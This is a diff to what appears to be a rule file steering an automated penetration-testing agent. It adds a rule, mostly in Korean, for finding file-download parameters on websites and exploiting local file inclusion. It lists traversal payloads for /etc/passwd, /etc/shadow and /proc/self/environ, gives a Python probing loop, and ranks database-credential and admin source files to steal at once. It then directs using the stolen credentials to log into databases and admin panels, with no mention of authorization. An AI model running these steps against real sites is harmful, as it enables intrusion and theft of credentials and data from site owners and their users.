@@ -3110,6 +3110,76 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
     LFI 없는 타겟: STEP 1 에서 모든 경로가 0B 또는 403 반환 시 → 자동으로 건너뜀
     추가 루프 증가 없이 기존 루프 내 병렬 섹션으로 처리
 
+  ── RULE 26-AN [v3.2.40]: 파일 다운로드 파라미터 → LFI 우선 테스트 (Loop 1~2 강제) ──
+
+  ▸ RULE 26-AN [v3.2.40]: 크롤링 단계에서 아래 패턴의 URL을 발견하면, SQLi 루프와 무관하게
+    Loop 1~2 내에 즉시 LFI/경로 탐색 테스트를 실행해야 한다. 이 규칙은 SQLi 실패 후 시도하는
+    것이 아니라 정찰 초기 단계에서 SQLi 와 동시 병렬 실행한다.
+
+  [LFI 대상 파라미터 패턴]
+    취약 파라미터 이름: file, realfile, path, filename, img, image, document, template,
+                        include, page, view, load, read, src, source, download, attach
+    취약 파일명 패턴 (PHP): download.php, view.php, read.php, load.php, loadImg.php,
+                             getFile.php, filedown.php, down.php, attach.php, common.php
+    예시 발견 URL:
+      /board/download.php?path=/uploads/...&realfile=abc.pdf&filename=abc.pdf
+      /view.php?file=docs/readme.txt
+      /include.php?page=notice
+
+  [STEP 1] LFI 탐지 스크립트 (Loop 1~2 내 병렬 섹션으로 실행)
+    file-like 파라미터를 가진 URL 목록 추출 후 즉시 아래 페이로드 테스트:
+
+    LFI_PAYLOADS = [
+        "../../../../../../../../etc/passwd",
+        "../../../../../../../../etc/shadow",
+        "../../../../../../../etc/httpd/conf/httpd.conf",
+        "../../../../../../../proc/self/environ",
+        # Windows
+        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+        "../../../../../../../../windows/win.ini",
+    ]
+
+    # path/realfile 조합 패턴 (download.php 타입):
+    # path 는 원래 값 유지, realfile 을 페이로드로 교체
+    for url, params in file_urls:
+        for param_name in ['realfile', 'file', 'filename', 'img', 'document', 'include', 'page']:
+            if param_name in params:
+                for payload in LFI_PAYLOADS:
+                    test_params = dict(params)
+                    test_params[param_name] = payload
+                    r = requests.get(url, params=test_params, ...)
+                    if b'root:' in r.content or b'[extensions]' in r.content or len(r.content) > 200:
+                        print(f"✅ LFI 확인: {url}?{param_name}={payload}")
+
+  [STEP 2] LFI 확인 즉시 — 설정 파일 탈취 우선순위
+    LFI 확인되면 아래 파일들을 즉시 읽는다 (RULE 26-AL 와 연계):
+    우선순위 1 — DB 자격증명 파일:
+      {DOC_ROOT}/include/db_info.php
+      {DOC_ROOT}/config/database.php
+      {DOC_ROOT}/config/db.php
+      {DOC_ROOT}/config.php
+      {DOC_ROOT}/connect.php
+      {DOC_ROOT}/_inc/db_connect.php
+      {DOC_ROOT}/common/config.php
+    우선순위 2 — DocumentRoot 확인 (모를 경우):
+      /etc/httpd/conf/httpd.conf → DocumentRoot 라인 파싱
+      /etc/apache2/sites-enabled/000-default.conf
+      /proc/self/environ → SERVER_ADDR, DOCUMENT_ROOT 환경변수 확인
+    우선순위 3 — 관리자 소스 (RULE 26-AL 와 동일):
+      {DOC_ROOT}/admin/index.php
+      {DOC_ROOT}/admin/login/login_proc.php
+
+  [STEP 3] 응답 검증 — 실제 파일 내용 vs 에러 구분
+    ✅ LFI 성공: 응답에 `root:x:0:0` (Linux) 또는 `[extensions]` (Windows win.ini) 포함
+    ✅ LFI 성공: PHP 소스 파일이면 `<?php` 또는 `$db` 또는 `mysql_connect` 포함
+    ❌ LFI 실패: 응답이 0B, 403, 또는 원래 파일 내용 그대로 (PDF/이미지 바이트)
+    ❌ 오탐 주의: URL이 그대로 반사(reflect)되는 경우 — 이것은 LFI 가 아니다
+
+  [STEP 4] SQLi 결과와의 우선순위
+    - LFI 로 DB 자격증명 획득 → MSSQL/MySQL 원격 접속 직접 시도 (SQLi 보다 효율적)
+    - LFI 로 관리자 계정 획득 → 관리자 패널 로그인 시도
+    - LFI 와 SQLi 는 병렬 진행: 어느 쪽이 먼저 성공해도 즉시 보고
+
   ── 27. SQLi Extraction & Oracle Quality ──
 
   ▸ RULE 27-A: EXTRACTVALUE / UPDATEXML result extraction — use the MySQL error format.
